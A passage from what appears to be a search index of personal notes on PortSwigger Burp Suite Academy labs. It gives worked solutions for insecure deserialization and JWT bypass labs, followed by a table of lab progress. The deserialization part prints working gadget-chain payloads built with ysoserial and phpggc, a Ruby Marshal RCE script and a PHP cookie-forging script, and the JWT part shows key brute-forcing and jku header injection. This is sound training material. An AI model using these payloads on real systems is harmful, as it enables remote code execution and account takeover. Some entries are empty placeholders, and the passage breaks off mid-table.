Decoder, use the correct syntax for serialized PHP data to create a `CustomTemplate` object with the `lock_file_path` attribute set to `/home/carlos/morale.txt`. Make sure to use the correct data type labels and length indicators. The final object should look like this:\n\n    `O:14:\"CustomTemplate\":1:{s:14:\"lock_file_path\";s:23:\"/home/carlos/morale.txt\";}`\n6. Base64 and URL-encode this object and save it to your clipboard.\n7. Send a request containing the session cookie to Burp Repeater.\n8. In Burp Repeater, replace the session cookie with the modified one in your clipboard.\n9. Send the request. The `__destruct()` magic method is automatically invoked and will delete Carlos's file.\n</code></pre>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#exploiting-java-deserialization-with-apache-commons","title":"Exploiting Java deserialization with Apache Commons","text":"<p>PRACTITIONER Exploiting Java deserialization with Apache Commons</p>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#enunciation_4","title":"Enunciation","text":"<p>This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.</p> <p>To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the <code>morale.txt</code> file from Carlos's home directory.</p> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#solution_4","title":"Solution","text":"<p>Install the following two plugins in Burpsuite: Java Deserialization Scanner and Java Serial Killer. With those, when browsing the site the Live audit will show us deserialization issues:</p> <p>In the Burpsuite scanner see the issues already identified.</p> <p></p> <p>Paste the vulnerable request in Deserialization Scanner &gt; Manual testing:</p> <p></p> <p></p> <p>Click on All issues and you can identify a disclosed vulnerability on library Apache Commons Collections 4. This will help in the following steps.</p> <p></p> <p>Now we can craft a payload using ysoserial tool (see debugging and installation there).</p> <p>As we have a java version 11, our payload will be:</p> <pre><code>java -jar ysoserial-all.jar CommonsCollections4 \"rm /home/carlos/morale.txt\" | base64 -w 0 &gt; test.txt\n\n# -w 0 : it will remove the end of lines.\n</code></pre> <p></p> <p>Now, we copy paste that value in the Cookie session, then we select it and with CTRL-u, we url-encode it (the key characters). Then we send the request.</p> <p></p> <pre><code># Burp solution\n\n1. Log in to your own account and observe that the session cookie contains a serialized Java object. Send a request containing your session cookie to Burp Repeater.\n2. Download the \"ysoserial\" tool and execute the following command. This generates a Base64-encoded serialized object containing your payload:\n\n    - In Java versions 16 and above:\n\n        `java -jar ysoserial-all.jar \\ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \\ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \\ --add-opens=java.base/java.net=ALL-UNNAMED \\ --add-opens=java.base/java.util=ALL-UNNAMED \\ CommonsCollections4 'rm /home/carlos/morale.txt' | base64`\n    - In Java versions 15 and below:\n\n        `java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64`\n3. In Burp Repeater, replace your session cookie with the malicious one you just created. Select the entire cookie and then URL-encode it.\n4. Send the request to solve the lab.\n</code></pre>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#exploiting-php-deserialization-with-a-pre-built-gadget-chain","title":"Exploiting PHP deserialization with a pre-built gadget chain","text":"<p>PRACTITIONER Exploiting PHP deserialization with a pre-built gadget chain</p>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#enunciation_5","title":"Enunciation","text":"<p>This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains.</p> <p>To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the <code>morale.txt</code> file from Carlos's home directory.</p> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#solution_5","title":"Solution","text":"<p>1. The cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash.</p> <p></p> <p>2. Changing cookie to a fake value will expose the Sympfony 4.3.6 php library.</p> <p></p> <p>3. Also have a look at the secret_key revealed in the commented url. </p> <p></p> <p>4. phpgcc has a gadget chain for that library</p> <p></p> <p>5. Create your payload with:</p> <pre><code>./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0 &gt; test.txt\n</code></pre> <p></p> <p>6. Construct a valid cookie containing this malicious object and sign it correctly using the secret key. Using this template:</p> <pre><code>&lt;?php \n$object = \"OBJECT-GENERATED-BY-PHPGGC\"; \n$secretKey = \"LEAKED-SECRET-KEY-FROM-PHPINFO.PHP\"; \n$cookie = urlencode('{\"token\":\"' . $object . '\",\"sig_hmac_sha1\":\"' . hash_hmac('sha1', $object, $secretKey) . '\"}'); \necho $cookie;\n</code></pre> <p>Generate a file lab.php customizing the script. Use the $secretKey obtained in step 3. Use the payload generated in step 5 for the $object.</p> <pre><code>?php\n$object = \"Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRh&gt;\n$secretKey = \"cvb2w284adozzw3m2wgbhmxn7ezi9s4v\";\n$cookie = urlencode('{\"token\":\"' . $object . '\",\"sig_hmac_sha1\":\"' . hash_hmac('sha1', $object, $secretKey) . '\"}');\necho $cookie;\n</code></pre> <p>7. Add permissions and run it:</p> <pre><code>chmod +x lab.php\nphp lab.php\n</code></pre> <p></p> <p>8. Place the generated cookie in the Coodie session in the Repeater and Send the request.</p> <p></p> <pre><code># Burp solution\n1. Log in and send a request containing your session cookie to Burp Repeater. Highlight the cookie and look at the **Inspector** panel.\n2. Notice that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash.\n3. Copy the decoded cookie from the **Inspector** and paste it into Decoder.\n4. In Decoder, highlight the token and then select **Decode as &gt; Base64**. Notice that the token is actually a serialized PHP object.\n5. In Burp Repeater, observe that if you try sending a request with a modified cookie, an exception is raised because the digital signature no longer matches. However, you should notice that:\n    - A developer comment discloses the location of a debug file at `/cgi-bin/phpinfo.php`.\n    - The error message reveals that the website is using the Symfony 4.3.6 framework.\n6. Request the `/cgi-bin/phpinfo.php` file in Burp Repeater and observe that it leaks some key information about the website, including the `SECRET_KEY` environment variable. Save this key; you'll need it to sign your exploit later.\n7. Download the \"PHPGGC\" tool and execute the following command:\n\n    `./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64`\n\n    This will generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony to delete Carlos's `morale.txt` file.\n\n8. You now need to construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained earlier. You can use the following PHP script to do this. Before running the script, you just need to make the following changes:\n\n    - Assign the object you generated in PHPGGC to the `$object` variable.\n    - Assign the secret key that you copied from the `phpinfo.php` file to the `$secretKey` variable.\n\n    `&lt;?php $object = \"OBJECT-GENERATED-BY-PHPGGC\"; $secretKey = \"LEAKED-SECRET-KEY-FROM-PHPINFO.PHP\"; $cookie = urlencode('{\"token\":\"' . $object . '\",\"sig_hmac_sha1\":\"' . hash_hmac('sha1', $object, $secretKey) . '\"}'); echo $cookie;`\n\n    This will output a valid, signed cookie to the console.\n\n9. In Burp Repeater, replace your session cookie with the malicious one you just created, then send the request to solve the lab.\n</code></pre>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#exploiting-ruby-deserialization-using-a-documented-gadget-chain","title":"Exploiting Ruby deserialization using a documented gadget chain","text":"<p>PRACTITIONER Exploiting Ruby deserialization using a documented gadget chain</p>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#enunciation_6","title":"Enunciation","text":"<p>This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.</p> <p>To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.</p> <p>You can log in to your own account using the following credentials: wiener:peter </p>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#solution_6","title":"Solution","text":"<p>1. Provoke an error message to disclose the library performing deserialization in the cookie session:</p> <p></p> <p>2. Find a documented vulnerability for that library at https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html</p> <p>3. Copy the original script:</p> <pre><code># Autoload the required classes\nGem::SpecFetcher\nGem::Installer\n\n# prevent the payload from running when we Marshal.dump it\nmodule Gem\n  class Requirement\n    def marshal_dump\n      [@requirements]\n    end\n  end\nend\n\nwa1 = Net::WriteAdapter.new(Kernel, :system)\n\nrs = Gem::RequestSet.allocate\nrs.instance_variable_set('@sets', wa1)\nrs.instance_variable_set('@git_set', \"id\")\n\nwa2 = Net::WriteAdapter.new(rs, :resolve)\n\ni = Gem::Package::TarReader::Entry.allocate\ni.instance_variable_set('@read', 0)\ni.instance_variable_set('@header', \"aaa\")\n\n\nn = Net::BufferedIO.allocate\nn.instance_variable_set('@io', i)\nn.instance_variable_set('@debug_output', wa2)\n\nt = Gem::Package::TarReader.allocate\nt.instance_variable_set('@io', n)\n\nr = Gem::Requirement.allocate\nr.instance_variable_set('@requirements', t)\n\npayload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])\nputs payload.inspect\nputs Marshal.load(payload)\n</code></pre> <p>4. And modify it:</p> <pre><code># Autoload the required classes\nGem::SpecFetcher\nGem::Installer\n\n# prevent the payload from running when we Marshal.dump it\nmodule Gem\n  class Requirement\n    def marshal_dump\n      [@requirements]\n    end\n  end\nend\n\nwa1 = Net::WriteAdapter.new(Kernel, :system)\n\nrs = Gem::RequestSet.allocate\nrs.instance_variable_set('@sets', wa1)\nrs.instance_variable_set('@git_set', \"rm /home/carlos/morale.txt\")\n\nwa2 = Net::WriteAdapter.new(rs, :resolve)\n\ni = Gem::Package::TarReader::Entry.allocate\ni.instance_variable_set('@read', 0)\ni.instance_variable_set('@header', \"aaa\")\n\n\nn = Net::BufferedIO.allocate\nn.instance_variable_set('@io', i)\nn.instance_variable_set('@debug_output', wa2)\n\nt = Gem::Package::TarReader.allocate\nt.instance_variable_set('@io', n)\n\nr = Gem::Requirement.allocate\nr.instance_variable_set('@requirements', t)\n\npayload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])\nputs Base64.encode64(payload)\n</code></pre> <p>Changes made: </p> <ul> <li>Last two lines to puts Base64.encode64(payload)</li> <li>User line <code>rs.instance_variable_set('@git_set', \"id\")</code> to inject the payload <code>rs.instance_variable_set('@git_set', \"rm /home/carlos/morale.txt\")</code>. </li> </ul> <p>5. Run it. You can use https://onecompiler.com/ruby/</p> <p></p> <p>6. Paste the generated payload into the session cookie in the repeater and have sent the request.</p> <p></p> <pre><code># Burp solution\n1. Log in to your own account and notice that the session cookie contains a serialized (\"marshaled\") Ruby object. Send a request containing this session cookie to Burp Repeater.\n2. Browse the web to find the `Universal Deserialisation Gadget for Ruby 2.x-3.x` by `vakzz` on `devcraft.io`. Copy the final script for generating the payload.\n3. Modify the script as follows:\n    - Change the command that should be executed from `id` to `rm /home/carlos/morale.txt`.\n    - Replace the final two lines with `puts Base64.encode64(payload)`. This ensures that the payload is output in the correct format for you to use for the lab.\n4. Run the script and copy the resulting Base64-encoded object.\n5. In Burp Repeater, replace your session cookie with the malicious one that you just created, then URL encode it.\n6. Send the request to solve the lab.\n</code></pre>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#j","title":"J","text":"","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#enunciation_7","title":"Enunciation","text":"<p>T</p>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#solution_7","title":"Solution","text":"<pre><code># Burp solution\n</code></pre>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#j_1","title":"J","text":"","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#enunciation_8","title":"Enunciation","text":"<p>T</p>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#solution_8","title":"Solution","text":"<pre><code># Burp solution\n</code></pre>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#j_2","title":"J","text":"","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#enunciation_9","title":"Enunciation","text":"<p>T</p>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#solution_9","title":"Solution","text":"<pre><code># Burp solution\n</code></pre>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-jwt/","title":"BurpSuite Labs - Json Web Token jwt","text":"","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#jwt-authentication-bypass-via-unverified-signature","title":"JWT authentication bypass via unverified signature","text":"","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#enunciation","title":"Enunciation","text":"<p>This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives.</p> <p>To solve the lab, modify your session token to gain access to the admin panel at <code>/admin</code>, then delete the user <code>carlos</code>.</p> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#solution","title":"Solution","text":"","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#jwt-authentication-bypass-via-flawed-signature-verification","title":"JWT authentication bypass via flawed signature verification","text":"","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#enunciation_1","title":"Enunciation","text":"<p>This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.</p> <p>To solve the lab, modify your session token to gain access to the admin panel at <code>/admin</code>, then delete the user <code>carlos</code>.</p> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#solution_1","title":"Solution","text":"","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#jwt-authentication-bypass-via-weak-signing-key","title":"JWT authentication bypass via weak signing key","text":"","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#enunciation_2","title":"Enunciation","text":"<p>This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets.</p> <p>To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at <code>/admin</code>, then delete the user <code>carlos</code>.</p> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#solution_2","title":"Solution","text":"<p>Capture the JWT of wiener user and run hashcat with a well-known dictionary of jwt secrets such as    https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list</p> <pre><code>hashcat -a 0 -m 16500 capturedJWT &lt;wordlist&gt;\n</code></pre> <p>Results:</p> <pre><code>eyJraWQiOiI2YTNmZjdmMi0xMDNmLTQyZGEtYmNkZC0yN2JiZmM4ZTU3OTQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDYwMTIyNSwic3ViIjoid2llbmVyIn0.AeWLmJpWTsA-c-dA5j6UHIQ-f9Mo6F9Y-OrXBsGu6Gw:secret1\n</code></pre> <p>Open JWT Editor, go to Keys tab and generate a new signature.</p> <p></p> <p>Send your request to repeater, go to JSON Web Token tab, modify username to administrator, click on Sign and select your signature. Modify endpoint to /admin and send request.</p> <p></p> <p>Trigger the delete user carlos endpoint:</p> <p></p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#jwt-authentication-bypass-via-jwk-header-injection","title":"JWT authentication bypass via jwk header injection","text":"","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#enunciation_3","title":"Enunciation","text":"<p>This lab uses a JWT-based mechanism for handling sessions. The server supports the <code>jwk</code> parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source.</p> <p>To solve the lab, modify and sign a JWT that gives you access to the admin panel at <code>/admin</code>, then delete the user <code>carlos</code>.</p> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#solution_3","title":"Solution","text":"<p>Capture wiener JWT and send the request GET /admin to the Repeater module. Once there, go to JSON Web Token tab and:</p> <p></p> <p></p> <p></p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#jwt-authentication-bypass-via-jku-header-injection","title":"JWT authentication bypass via jku header injection","text":"","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#enunciation_4","title":"Enunciation","text":"<p>This lab uses a JWT-based mechanism for handling sessions. The server supports the <code>jku</code> parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key.</p> <p>To solve the lab, forge a JWT that gives you access to the admin panel at <code>/admin</code>, then delete the user <code>carlos</code>.</p> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#solution_4","title":"Solution","text":"<pre><code>##### Part 1 - Upload a malicious JWK Set\n\n1. In Burp, load the JWT Editor extension from the BApp store.\n\n2. In the lab, log in to your own account and send the post-login `GET /my-account` request to Burp Repeater.\n\n3. In Burp Repeater, change the path to `/admin` and send the request. Observe that the admin panel is only accessible when logged in as the `administrator` user.\n\n4. Go to the **JWT Editor Keys** tab in Burp's main tab bar.\n\n5. Click **New RSA Key**.\n\n6. In the dialog, click **Generate** to automatically generate a new key pair, then click **OK** to save the key. Note that you don't need to select a key size as this will automatically be updated later.\n\n7. In the browser, go to the exploit server.\n\n8. Replace the contents of the **Body** section with an empty JWK Set as follows:\n\n    `{ \"keys\": [ ] }`\n9. Back on the **JWT Editor Keys** tab, right-click on the entry for the key that you just generated, then select **Copy Public Key as JWK**.\n\n10. Paste the JWK into the `keys` array on the exploit server, then store the exploit. The result should look something like this:\n\n    `{ \"keys\": [ { \"kty\": \"RSA\", \"e\": \"AQAB\", \"kid\": \"893d8f0b-061f-42c2-a4aa-5056e12b8ae7\", \"n\": \"yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw\" } ] }`\n\n##### Part 2 - Modify and sign the JWT\n\n1. Go back to the `GET /admin` request in Burp Repeater and switch to the extension-generated **JSON Web Token** message editor tab.\n\n2. In the header of the JWT, replace the current value of the `kid` parameter with the `kid` of the JWK that you uploaded to the exploit server.\n\n3. Add a new `jku` parameter to the header of the JWT. Set its value to the URL of your JWK Set on the exploit server.\n\n4. In the payload, change the value of the `sub` claim to `administrator`.\n\n5. At the bottom of the tab, click **Sign**, then select the RSA key that you generated in the previous section.\n\n6. Make sure that the **Don't modify header** option is selected, then click **OK**. The modified token is now signed with the correct signature.\n\n7. Send the request. Observe that you have successfully accessed the admin panel.\n\n8. In the response, find the URL for deleting `carlos` (`/admin/delete?username=carlos`). Send the request to this endpoint to solve the lab.\n</code></pre>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#b","title":"B","text":"","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#enunciation_5","title":"Enunciation","text":"<p>T</p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#solution_5","title":"Solution","text":"<p>I</p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#b_1","title":"B","text":"","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#enunciation_6","title":"Enunciation","text":"<p>T</p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#solution_6","title":"Solution","text":"<p>I</p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#b_2","title":"B","text":"","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#enunciation_7","title":"Enunciation","text":"<p>T</p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-jwt/#solution_7","title":"Solution","text":"<p>I</p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-labs/","title":"BurpSuite Labs","text":"","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#sql-injection","title":"SQL injection","text":"Solution SQL injection level link Solved sqli-1 SQL injection Apprentice SQL injection vulnerability in WHERE clause allowing retrieval of hidden data Solved sqli-2 SQL injection Apprentice SQL injection vulnerability allowing login bypass Solved sqli-3 SQL injection Practitioner SQL injection UNION attack, determining the number of columns returned by the query Solved sqli-4 SQL injection Practitioner SQL injection UNION attack, finding a column containing text Solved sqli-5 SQL injection Practitioner SQL injection UNION attack, retrieving data from other tables Solved sqli-6 SQL injection Practitioner SQL injection UNION attack, retrieving multiple values in a single column Solved SQL injection Practitioner SQL injection attack, querying the database type and version on Oracle Not solved SQL injection Practitioner SQL injection attack, querying the database type and version on MySQL and Microsoft Not solved SQL injection Practitioner SQL injection attack, listing the database contents on non-Oracle databases Not solved SQL injection Practitioner SQL injection attack, listing the database contents on Oracle Not solved SQL injection Practitioner Blind SQL injection with conditional responses Not solved SQL injection Practitioner Blind SQL injection with conditional errors Not solved SQL injection Practitioner Blind SQL injection with time delays Not solved SQL injection Practitioner Blind SQL injection with time delays and information retrieval Not solved SQL injection Practitioner Blind SQL injection with out-of-band interaction Not solved SQL injection Practitioner Blind SQL injection with out-of-band data exfiltration Not solved SQL injection Practitioner SQL injection with filter bypass via XML encoding Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#cross-site-scripting","title":"Cross-site scripting","text":"Solution level link Solved Solution xss-1 Cross-site scripting Apprentice Reflected XSS into HTML context with nothing encoded Solved xss-2 Cross-site scripting Apprentice Stored XSS into HTML context with nothing encoded Solved xss-3 Cross-site scripting Apprentice DOM XSS in\u00a0<code>document.write</code>\u00a0sink using source\u00a0<code>location.search</code> Solved xss-4 Cross-site scripting Apprentice DOM XSS in\u00a0<code>innerHTML</code>\u00a0sink using source\u00a0<code>location.search</code> Solved xss-5 Cross-site scripting Apprentice DOM XSS in jQuery anchor\u00a0<code>href</code>\u00a0attribute sink using\u00a0<code>location.search</code>\u00a0source Solved xss-6 Cross-site scripting Apprentice DOM XSS in jQuery selector sink using a hashchange event Solved Cross-site scripting Apprentice Reflected XSS into attribute with angle brackets HTML-encoded Not solved Cross-site scripting Apprentice Stored XSS into anchor\u00a0<code>href</code>\u00a0attribute with double quotes HTML-encoded Not solved Cross-site scripting Apprentice Reflected XSS into a JavaScript string with angle brackets HTML encoded Not solved Cross-site scripting (burpsuite-xss.md) Practitioner DOM XSS in\u00a0<code>document.write</code>\u00a0sink using source\u00a0<code>location.search</code>\u00a0inside a select element Not solved Cross-site scripting Practitioner DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded Not solved Cross-site scripting Practitioner Reflected DOM XSS Not solved Cross-site scripting Practitioner Stored DOM XSS Not solved Cross-site scripting Practitioner Exploiting cross-site scripting to steal cookies Not solved Cross-site scripting Practitioner Exploiting cross-site scripting to capture passwords Not solved Cross-site scripting Practitioner Exploiting XSS to perform CSRF Not solved Cross-site scripting Practitioner Reflected XSS into HTML context with most tags and attributes blocked Not solved Cross-site scripting Practitioner Reflected XSS into HTML context with all tags blocked except custom ones Not solved Cross-site scripting Practitioner Reflected XSS with some SVG markup allowed Not solved Cross-site scripting Practitioner Reflected XSS in canonical link tag Not solved Cross-site scripting Practitioner Reflected XSS into a JavaScript string with single quote and backslash escaped Not solved Cross-site scripting Practitioner Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped Not solved Cross-site scripting Practitioner Stored XSS into\u00a0<code>onclick</code>\u00a0event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped Not solved Cross-site scripting Practitioner Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped Not solved Cross-site scripting Expert Reflected XSS with event handlers and\u00a0<code>href</code>\u00a0attributes blocked Not solved Cross-site scripting Expert Reflected XSS in a JavaScript URL with some characters blocked Not solved Cross-site scripting Expert Reflected XSS with AngularJS sandbox escape without strings Not solved Cross-site scripting Expert Reflected XSS with AngularJS sandbox escape and CSP Not solved Cross-site scripting Expert Reflected XSS protected by very strict CSP, with dangling markup attack Not solved Cross-site scripting Expert Reflected XSS protected by CSP, with CSP bypass Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#cross-site-request-forgery","title":"Cross-Site Request Forgery","text":"Cross-site Request Forgery level link Solved Cross-site Request Forgery Apprentice CSRF vulnerability with no defenses Not solved Cross-site Request Forgery Practitioner CSRF where token validation depends on request method Not solved Cross-site Request Forgery Practitioner CSRF where token validation depends on token being present Not solved Cross-site Request Forgery Practitioner CSRF where token is not tied to user session Not solved Cross-site Request Forgery Practitioner CSRF where token is tied to non-session cookie Not solved Cross-site Request Forgery Practitioner CSRF where token is duplicated in cookie Not solved Cross-site Request Forgery Practitioner SameSite Lax bypass via method override Not solved Cross-site Request Forgery Practitioner SameSite Strict bypass via client-side redirect Not solved Cross-site Request Forgery Practitioner SameSite Strict bypass via sibling domain Not solved Cross-site Request Forgery Practitioner SameSite Lax bypass via cookie refresh Not solved Cross-site Request Forgery Practitioner CSRF where Referer validation depends on header being present Not solved Cross-site Request Forgery Practitioner CSRF with broken Referer validation Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#clickjacking","title":"Clickjacking","text":"Clikjacking level link Solved Clikjacking Apprentice Basic clickjacking with CSRF token protection Not solved Clikjacking Apprentice Clickjacking with form input data prefilled from a URL parameter Not solved Clikjacking Apprentice Clickjacking with a frame buster script Not solved Clikjacking Practitioner Exploiting clickjacking vulnerability to trigger DOM-based XSS Not solved Clikjacking Practitioner Multistep clickjacking Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#dom-based-vulnerabilities","title":"DOM-based vulnerabilities","text":"DOM-based vulnerabilities level link Solved DOM-based vulnerabilities Practitioner DOM XSS using web messages Not solved DOM-based vulnerabilities Practitioner DOM XSS using web messages and a JavaScript URL Not solved DOM-based vulnerabilities Practitioner DOM XSS using web messages and\u00a0<code>JSON.parse</code> Not solved DOM-based vulnerabilities Practitioner DOM-based open redirection Not solved DOM-based vulnerabilities Practitioner DOM-based cookie manipulation Not solved DOM-based vulnerabilities Expert Exploiting DOM clobbering to enable XSS Not solved DOM-based vulnerabilities Expert Clobbering DOM attributes to bypass HTML filters Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#cross-origin-resource-sharing","title":"Cross-origin resource sharing","text":"Cross-origin resource sharing level link Solved Cross-origin resource sharing Apprentice CORS vulnerability with basic origin reflection Not solved Cross-origin resource sharing Apprentice CORS vulnerability with trusted null origin Not solved Cross-origin resource sharing Practitioner CORS vulnerability with trusted insecure protocols Not solved Cross-origin resource sharing Expert CORS vulnerability with internal network pivot attack Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#xml-external-entity","title":"XML external entity","text":"XML external entity level link Solved xxe-1 Apprentice Exploiting XXE using external entities to retrieve files Solved xxe-2 Apprentice Exploiting XXE to perform SSRF attacks Solved xxe-3 Practitioner Blind XXE with out-of-band interaction Solved xxe-4 Practitioner Blind XXE with out-of-band interaction via XML parameter entities Solved xxe-5 Practitioner Exploiting blind XXE to exfiltrate data using a malicious external DTD Solved xxe-6 Practitioner Exploiting blind XXE to retrieve data via error messages Solved xxe-7 Practitioner Exploiting XInclude to retrieve files Solved xxe-8 Practitioner Exploiting XXE via image file upload Solved xxe-9 Expert Exploiting XXE to retrieve data by repurposing a local DTD Solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#server-side-request-forgery","title":"Server-side request forgery","text":"Server-side request forgery level link Solved ssrf-1 Server-side request forgery Apprentice Basic SSRF against the local server Solved ssrf-2 Server-side request forgery Apprentice Basic SSRF against another back-end system Solved ssrf-3 Server-side request forgery Practitioner SSRF with blacklist-based input filter Solved ssrf-4 Server-side request forgery Practitioner SSRF with filter bypass via open redirection vulnerability Not solved Server-side request forgery Practitioner Blind SSRF with out-of-band detection Not solved Server-side request forgery Expert SSRF with whitelist-based input filter Not solved Server-side request forgery Expert Blind SSRF with Shellshock exploitation Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#http-request-smuggling","title":"HTTP request smuggling","text":"HTTP request smuggling level link Solved HTTP request smuggling Practitioner HTTP request smuggling, basic CL.TE vulnerability Not solved HTTP request smuggling Practitioner HTTP request smuggling, basic TE.CL vulnerability Not solved HTTP request smuggling Practitioner HTTP request smuggling, obfuscating the TE header Not solved HTTP request smuggling Practitioner HTTP request smuggling, confirming a CL.TE vulnerability via differential responses Not solved HTTP request smuggling Practitioner HTTP request smuggling, confirming a TE.CL vulnerability via differential responses Not solved HTTP request smuggling Practitioner Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability Not solved HTTP request smuggling Practitioner Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability Not solved HTTP request smuggling Practitioner Exploiting HTTP request 